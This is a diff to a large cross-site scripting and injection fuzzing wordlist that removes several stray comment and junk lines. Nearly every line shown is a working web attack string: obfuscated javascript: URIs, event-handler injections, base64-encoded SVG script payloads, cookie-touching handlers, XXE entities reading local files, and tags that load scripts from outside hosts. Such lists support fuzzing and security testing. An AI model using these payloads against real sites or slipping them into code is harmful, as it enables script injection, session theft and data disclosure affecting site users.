@@ -644,7 +644,6 @@ about://xss.cx
 <a/href=java&Tab;script:confirm%28/XSS/%29>click</a>
 <a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
 <a/onmouseover[\x0b]=location='\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6 C\x65\x72\x74\x28\x30\x29\x3B'>xss
-<a
 [\x0B]onmosemove=confirm('\Done\')>
 <a[\x0B]
 onmouseover
@@ -740,7 +739,6 @@ http://www.<script>confirm(1)</script .com
 <iframe width=0 height=0 src="javascript:confirm(1)">
 <iframe/%00/ src=javaSCRIPT&colon;confirm(1)
 "><iframe%20src="http://google.com"%%203E
-iframe.contentWindow.location.constructor.prototype
 <iframe><iframe src=javascript:confirm(4)></iframe>
 <iframe/name="if(0){\u0061lert(1)}else{\u0061lert(1)}"/onload="eval(name)";>
 <iframe/name="if(0){\u0061lert(1)}else{\u0061lert(1)}"/onload="eval(name)";> 
@@ -2403,7 +2401,6 @@ width:\0065\0078\0070\0072\0065\0073\0073\0069\006F\006E\0028\0070\0072\006F\006
 javascript:prompt(1)
 javascript:\u0070rompt&#x28;1&#x29;
 jAvAsCrIpT&colon;prompt&lpar;1&rpar;
-http://jsfiddle.net/xboz/c7vvkedv/
 <EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
 "><EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
 '><EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
@@ -2563,7 +2560,6 @@ Data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==
 %27; confirm(1); %27 
 &apos;; confirm(1); &apos; 
 \u0027 confirm(1); \u0027 
-"; [][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])(); "
 "; eval('\u0061'+'\x6c'+'e'+'r'+'t')(2); "
 "; alert&#40 3&#41 ; "
 "; javascript:&#x61;ler\u0074&lpar;4); "
@@ -5512,7 +5508,6 @@ b'//////////////////////////////////////////////////////////////////////////////
 b'//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////'
 b'//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////'
 b'//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////'
-b'////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////'
 b'<IMG SRC="javascript:alert(cross_site_scripting.nasl);">'
 b'<script>cross_site_scripting.nasl</script>'
 b'<meta http-equiv=Set-Cookie content="testjckd=714">'
@@ -7565,7 +7560,6 @@ JaVAscRIPT:confirm(4)
 (javascript:window.onerror=confirm;throw%20document.cookie)
 0\%22))}catch(e){confirm(2)}//
 Components.lookupMethod(self, 'confirm')(1)
-Data URl
 "; ||confirm('XSS') || "
 '';!--"<XSS>=&{()}
 '';!--"<XSS>=&{()}
@@ -9759,8 +9753,6 @@ http://www.<script>alert(1)</script .com
 <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://127.0.0.1:80" >]>
 <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://127.0.0.1:81" >]>
 <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo>
-<test></test>
-<![CDATA[<test></test>]]>
 &foo;
 %foo;
 count(/child::node())
@@ -11698,8 +11690,6 @@ a=1;a=eval;b=alert;a(b(11));//
 1];a=eval;b=alert;a(b(17));//
 1;a=eval;b=alert;a(b(/c/.source));
 xyz onerror=alert(6);
-> XSS | Replacive Fuzzers
->>This is a comment line to be changed in the future
 <img src=`x` onrerror= ` ;; alert(1) ` />
 </a style=""xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')">
 style=color: expression(alert(0));" a="
@@ -11738,8 +11728,6 @@ exp/*<XSS STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert
 firefoxurl:test|"%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');"
 res://c:\\program%20files\\adobe\\acrobat%207.0\\acrobat\\acrobat.dll/#2/#210
 >%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>
-> XSS | Replacive Fuzzers
->>This is a comment line to be changed in the future
 (1?(1?{a:1?""[1?"ev\a\l":0](1?"\a\lert":0):0}:0).a:0)[1?"\c\a\l\l":0](content,1?"x\s\s":0)
 <STYLE TYPE="text/javascript">alert('XSS');</STYLE>
 <SCRIPT SRC=http://ha.ckers.org/xss.js
@@ -14324,7 +14312,6 @@ a=%1B$*H%1BN&b=%20type=image%20src=x%20onerror=alert(document.c haracterSet);//
 &Keywords=%22%22%3Cscript%3Ealert(%22xss%22)%3C/script%3E
 &keywords='<script>alert(String.fromCharCode(88,83,83))</script>
 &q=%3Cbody+onload%3Dalert(%22XSS%22);%3E
-&as2n32vujas83bn2932g=645492598632
 &subSection=%3Cscript%3Ealert(%22XSS%22)%3C/script%3E&headParams=management
 &qt=%3Cscript%3Ealert(%22XSS%22)%3C/script%3E&published=on&active_tab=site
 &c=10"><script>alert('XSS')</script>
@@ -14642,7 +14629,6 @@ a=%1B$*H%1BN&b=%20type=image%20src=x%20onerror=alert(document.c haracterSet);//
 &kid=TTB2
 &q=hi.com%27%20style%3d%27height:10000px%27%20onmouseover%3d%27alert%28%22xss%22%29
 &q=test&max=100&adv_age=1100&server=%22%3E%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E
-&v=s_78bk3dZcc
 &mode=try&partner=Shopify&country=%22%3E%3Cimg%20src=x%20onerror=prompt%28/@The_Pr0ph3t/%29;%3E
 &s=test%22%3E%3Cscript%3Ealert%281%29%3C/script%3Ehello&lang=en
 &err=1&locationTerm=2031'});}catch(err){}alert(0);try{alert(a={'asd':'a
@@ -14768,8 +14754,6 @@ a=%1B$*H%1BN&b=%20type=image%20src=x%20onerror=alert(document.c haracterSet);//
 &query=%27%22%3E%3C/script%3E%3Cmarquee/onstart=confirm%28document.domain%29%3E%3E&activeTabIndex=1&searchContext=Personal&loggedIn=false&site=shop
 &type=itpPeople&pageLength=5&q=0\\%22autofocus%2Fonfocus%3Dalert%28%2FXSSPO+SED%2F%29--%3E%3Cvideo%2Fposter%2Fonerror%3Dprompt%28%2FXSSPOSED%2F%29%3E%22-confirm%28%2FXSSPOSED%2F%29-%22
 &q=Psycho_Mantis%22%3E%3Csvg/onload=alert(document.domain)%3C%22
-&i=WmYmMm28
-&q=foobar&after=fizzbuzz
 &page=%22%3E%3CScRipT%3Ealert%28/xssposed/%29%3C%2FScrIpT%3E
 &gws_rd=ssl#q=inurl:ReferralType%3DW
 &list=PLpr-xdpM8wG-ZTcHhFfAeBthNVZVEtkg9
